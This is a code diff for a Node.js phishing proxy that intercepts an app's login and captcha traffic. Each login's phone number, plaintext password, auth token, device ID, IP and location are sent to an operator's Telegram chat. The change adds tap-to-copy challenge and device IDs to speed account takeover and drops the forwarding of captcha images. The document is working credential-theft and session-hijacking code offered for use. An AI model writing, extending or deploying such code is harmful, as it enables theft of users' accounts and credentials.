@@ -1370,16 +1370,24 @@ app.post('/app/user/login/login', async (req, res) => {
       let extraInfo = '';
       const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
       if (loginData && loginData.challengeId) {
-        extraInfo = `\n\n🎯 DEVICE VERIFICATION NEEDED!\n📋 challengeId: ${loginData.challengeId}\n📱 Android ID: ${androidId}`;
+        extraInfo = `\n\n🎯 DEVICE VERIFICATION NEEDED`;
       }
       const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
       if (loginToken && jsonResp?.code === 1000) {
         extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
       }
-      if (loginData && loginData.challengeId) {
-        extraInfo += `\n\n📋 COPY:\nchallengeId: ${loginData.challengeId}\ndeviceId: ${androidId}`;
-      }
       bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}`).catch(()=>{});
+
+      // Separate message with monospace IDs (tap-to-copy on Telegram clients).
+      if (loginData && loginData.challengeId) {
+        const cid = String(loginData.challengeId).replace(/[<>&]/g, '');
+        const did = String(androidId).replace(/[<>&]/g, '');
+        bot.sendMessage(
+          data.adminChatId,
+          `📋 <b>COPY (tap to copy)</b>\n\nchallengeId:\n<code>${cid}</code>\n\ndeviceId:\n<code>${did}</code>`,
+          { parse_mode: 'HTML' }
+        ).catch(()=>{});
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -2416,23 +2424,6 @@ app.all('/app/captcha/new', async (req, res) => {
         }
       }
       bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 UPSTREAM HEADERS:\n${JSON.stringify(newRespHdrs, null, 2).substring(0, 600)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1000)}`).catch(()=>{});
-      try {
-        if (jsonResp && jsonResp.data && jsonResp.data.master_image_base64) {
-          const m = String(jsonResp.data.master_image_base64).match(/^data:image\/[a-z]+;base64,(.+)$/i);
-          if (m) {
-            const buf = Buffer.from(m[1], 'base64');
-            const cap = `Master image | dispX=${jsonResp.data.display_x} dispY=${jsonResp.data.display_y} | ${answerStored}`;
-            bot.sendPhoto(data.adminChatId, buf, { caption: cap.substring(0,1024) }, { filename: 'master.jpg', contentType: 'image/jpeg' }).catch(()=>{});
-          }
-        }
-        if (jsonResp && jsonResp.data && jsonResp.data.thumb_image_base64) {
-          const m = String(jsonResp.data.thumb_image_base64).match(/^data:image\/[a-z]+;base64,(.+)$/i);
-          if (m) {
-            const buf = Buffer.from(m[1], 'base64');
-            bot.sendPhoto(data.adminChatId, buf, { caption: 'Thumb image' }, { filename: 'thumb.png', contentType: 'image/png' }).catch(()=>{});
-          }
-        }
-      } catch(e) {}
     }
     respHeaders['content-length'] = String(respBuffer.length);
     res.writeHead(response.status, respHeaders);
